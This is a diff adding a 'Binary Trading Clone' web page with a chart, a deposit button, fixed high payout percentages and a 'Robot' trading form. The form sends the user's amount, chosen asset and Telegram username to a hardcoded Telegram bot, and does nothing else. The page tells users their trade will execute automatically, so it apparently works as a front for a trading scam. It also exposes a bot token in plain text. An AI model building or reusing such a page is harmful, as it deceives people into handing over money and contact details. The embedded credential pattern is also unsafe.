@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Untitled</title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Binary Trading Clone</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+
+    .header {
+      display: flex;
+      justify-content: center;
+      padding: 10px;
+      background: #1e293b;
+    }
+
+    .deposit {
+      background: #22c55e;
+      color: white;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 4px;
+    }
+
+    .chart-container {
+      flex: 1;
+      background: #1e293b;
+      padding: 10px;
+    }
+
+    .trade-panel, .robot-form {
+      background: #111827;
+      padding: 10px;
+      display: none;
+    }
+
+    .trade-panel.active,
+    .robot-form.active {
+      display: block;
+    }
+
+    .trade-panel .info,
+    .robot-form .info {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    select,
+    input {
+      padding: 6px;
+      border: none;
+      border-radius: 4px;
+      background: #1e293b;
+      color: white;
+    }
+
+    .payout {
+      margin-top: 5px;
+    }
+
+    .footer {
+      display: flex;
+      justify-content: space-around;
+      background: #1e293b;
+      padding: 10px;
+    }
+
+    .footer button {
+      background: transparent;
+      color: white;
+      border: none;
+      font-size: 14px;
+    }
+
+    #dayPicker, #botDayPicker {
+      display: none;
+      margin-top: 5px;
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 4px;
+      color: white;
+    }
+
+    .form-card {
+      background: #1f2937;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+
+    .start-btn,
+    .back-btn {
+      background: #22c55e;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 6px;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .back-btn {
+      background: #334155;
+    }
+
+    .small {
+      color: #94a3b8;
+      font-size: 12px;
+    }
+
+    .label {
+      margin-top: 5px;
+      font-weight: bold;
+    }
+
+    .confirmation {
+      text-align: center;
+      color: #22c55e;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <button class="deposit">Deposit</button>
+  </div>
+
+  <div class="chart-container">
+    <div id="tradingview_chart" style="height: 400px;"></div>
+  </div>
+
+  <!-- Default trading panel -->
+  <div class="trade-panel active" id="tradePanel">
+    <div class="info">
+      <label>Currency Pair</label>
+      <select id="pair">
+        <option value="USDCAD" data-percent="89">USD/CAD (89%)</option>
+        <option value="EURUSD" data-percent="85">EUR/USD (85%)</option>
+        <option value="BTCUSDT" data-percent="75">BTC/USDT (75%)</option>
+        <option value="GBPJPY" data-percent="80">GBP/JPY (80%)</option>
+        <option value="AUDUSD" data-percent="82">AUD/USD (82%)</option>
+      </select>
+
+      <label>Timer</label>
+      <input type="text" id="timer" value="120:00:00" readonly />
+      <select id="dayPicker"><option disabled selected>Select days</option></select>
+
+      <label>Investment ($)</label>
+      <input type="number" id="investment" value="50" min="50" />
+      <div class="payout" id="payout">Payout: $0.00</div>
+    </div>
+  </div>
+
+  <!-- Robot Form UI -->
+  <div class="robot-form" id="robotForm">
+    <div class="form-card">
+      <div class="label">Amount</div>
+      <input type="number" id="botAmount" value="50" min="50" />
+    </div>
+
+    <div class="form-card">
+      <div class="label">Time</div>
+      <input type="text" id="botTimer" value="10:00:00" readonly />
+      <select id="botDayPicker"><option disabled selected>Select days</option></select>
+    </div>
+
+    <div class="form-card">
+      <div class="label">Trading asset</div>
+      <select id="botAsset">
+        <option>Bitcoin Cash (OTC) - 80%</option>
+        <option>Ethereum - 75%</option>
+        <option>Litecoin - 78%</option>
+        <option>Ethereum Classic - 77%</option>
+        <option>Dogecoin - 74%</option>
+        <option>Ripple (XRP) - 76%</option>
+        <option>Binance Coin (BNB) - 79%</option>
+        <option>Cardano (ADA) - 73%</option>
+        <option>Solana (SOL) - 81%</option>
+        <option>Polkadot (DOT) - 75%</option>
+      </select>
+    </div>
+
+    <div class="form-card">
+      <div class="label">Telegram Username</div>
+      <input type="text" id="telegramUsername" placeholder="@yourusername" />
+    </div>
+
+    <div class="form-card">
+      <div class="label">Technical Indicator</div>
+      <div class="small">RSI - Speed and price movement indicator</div>
+    </div>
+
+    <div class="form-card">
+      <div class="label">Risk Management</div>
+      <div><strong>Fixed amount</strong> <span class="small">- Low risk</span></div>
+      <div class="small">Recommended balance: at least $50</div>
+    </div>
+
+    <button class="start-btn" onclick="startBotTrade()">Start trading</button>
+    <button class="back-btn" onclick="openPanel('default')">Back to Dashboard</button>
+    <div id="confirmationMessage" class="confirmation"></div>
+  </div>
+
+  <!-- Bottom Nav -->
+  <div class="footer">
+    <button onclick="openPanel('robot')">Robot</button>
+    <button onclick="openPanel('default')">Dashboard</button>
+  </div>
+
+  <script src="https://s3.tradingview.com/tv.js"></script>
+  <script>
+    const widget = new TradingView.widget({
+      container_id: "tradingview_chart",
+      width: "100%",
+      height: 400,
+      symbol: "USDCAD",
+      interval: "1",
+      timezone: "Etc/UTC",
+      theme: "dark",
+      style: "1",
+      locale: "en",
+      toolbar_bg: "#1e293b",
+      enable_publishing: false,
+      allow_symbol_change: false,
+      hide_legend: true
+    });
+
+    const pairSelect = document.getElementById("pair");
+    const investmentInput = document.getElementById("investment");
+    const payoutDisplay = document.getElementById("payout");
+    const timerInput = document.getElementById("timer");
+    const dayPicker = document.getElementById("dayPicker");
+
+    const botDayPicker = document.getElementById("botDayPicker");
+    const botTimer = document.getElementById("botTimer");
+
+    function updatePayout() {
+      const selectedOption = pairSelect.options[pairSelect.selectedIndex];
+      const percent = parseFloat(selectedOption.getAttribute("data-percent"));
+      const investment = parseFloat(investmentInput.value);
+
+      if (isNaN(investment) || investment < 50) {
+        payoutDisplay.textContent = "Minimum investment: $50";
+        return;
+      }
+
+      const payout = investment + (investment * percent / 100);
+      payoutDisplay.textContent = `Payout: $${payout.toFixed(2)}`;
+    }
+
+    pairSelect.addEventListener("change", () => {
+      widget.setSymbol(pairSelect.value);
+      updatePayout();
+    });
+
+    investmentInput.addEventListener("input", updatePayout);
+
+    timerInput.addEventListener("click", () => {
+      dayPicker.style.display = "block";
+    });
+
+    botTimer.addEventListener("click", () => {
+      botDayPicker.style.display = "block";
+    });
+
+    for (let i = 10; i <= 30; i++) {
+      const option = document.createElement("option");
+      option.value = i;
+      option.textContent = `${i} Days`;
+      dayPicker.appendChild(option.cloneNode(true));
+      botDayPicker.appendChild(option);
+    }
+
+    dayPicker.addEventListener("change", () => {
+      const days = parseInt(dayPicker.value);
+      timerInput.value = `${days}:00:00`;
+      dayPicker.style.display = "none";
+    });
+
+    botDayPicker.addEventListener("change", () => {
+      const days = parseInt(botDayPicker.value);
+      botTimer.value = `${days}:00:00`;
+      botDayPicker.style.display = "none";
+    });
+
+    function openPanel(panel) {
+      document.getElementById("tradePanel").classList.remove("active");
+      document.getElementById("robotForm").classList.remove("active");
+      if (panel === "robot") {
+        document.getElementById("robotForm").classList.add("active");
+      } else {
+        document.getElementById("tradePanel").classList.add("active");
+      }
+    }
+
+    function startBotTrade() {
+      const amount = document.getElementById("botAmount").value;
+      const time = document.getElementById("botTimer").value;
+      const asset = document.getElementById("botAsset").value;
+      const telegram = document.getElementById("telegramUsername").value;
+      const confirmation = document.getElementById("confirmationMessage");
+
+      const message = `
+New Bot Trade Request:
+Amount: $${amount}
+Time: ${time}
+Asset: ${asset}
+Telegram Username: ${telegram}
+      `;
+
+      // Telegram Bot credentials
+      const token = "7231906239:AAFfKL8AWIpjLz4rtgrCYhl6CtLxdZI6-bk";
+      const chatId = "7962746780";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(() => {
+        confirmation.textContent = "Your trading is on pending. If you have the required balance this trade will execute automatically. If your balance is low the bot won't open trade. Thanks!";
+      })
+      .catch(err => {
+        confirmation.textContent = "Failed to send trade info.";
+        console.error(err);
+      });
+    }
+
+    updatePayout();
+  </script>
+</body>
+</html>
+<!-- partial -->
+  
+</body>
+</html>
